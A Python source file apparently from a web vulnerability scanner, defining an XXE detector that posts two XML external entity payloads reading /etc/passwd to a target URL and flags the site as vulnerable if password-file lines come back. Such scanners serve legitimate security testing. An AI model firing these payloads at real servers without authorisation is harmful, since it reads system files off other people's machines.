"""XXE Scanner — XML External Entity injection detection."""

from typing import List
from .findings import Finding
from ..core.ratelimit import get_limiter


class XXEScanner:
    """Tests for XML External Entity injection."""

    NAME = "xxe"

    XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

    XXE_PARAMETER_ENTITY = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY test "%xxe;">
]>
<root>&test;</root>"""

    def __init__(self, rps: float = 3.0):
        self.limiter = get_limiter(rps)

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Test for XXE by sending XML payloads."""
        try:
            import httpx
        except ImportError:
            return []

        findings = []
        client = httpx.Client(follow_redirects=True, timeout=10, verify=False,
                              headers={"Content-Type": "application/xml"})

        for payload_name, payload in [("direct entity", self.XXE_PAYLOAD),
                                       ("parameter entity", self.XXE_PARAMETER_ENTITY)]:
            self.limiter.wait(urlparse(url).netloc)
            try:
                resp = client.post(url, content=payload)
                body = resp.text

                if "root:" in body or "daemon:" in body:
                    findings.append(Finding(
                        vuln_type="XML External Entity (XXE)",
                        title=f"XXE injection ({payload_name})",
                        severity="CRITICAL",
                        url=url,
                        method="POST",
                        payload=payload[:200],
                        evidence="File content (/etc/passwd) returned in response",
                        description=f"XXE vulnerability allows reading local files via {payload_name}.",
                        remediation="Disable XML external entity processing. Use JSON instead of XML.",
                        cvss=9.1,
                        cwe="CWE-611",
                        tool=self.NAME,
                        verified=True,
                        confidence="CONFIRMED",
                    ))
                    return findings

            except Exception:
                continue

        return findings


from urllib.parse import urlparse
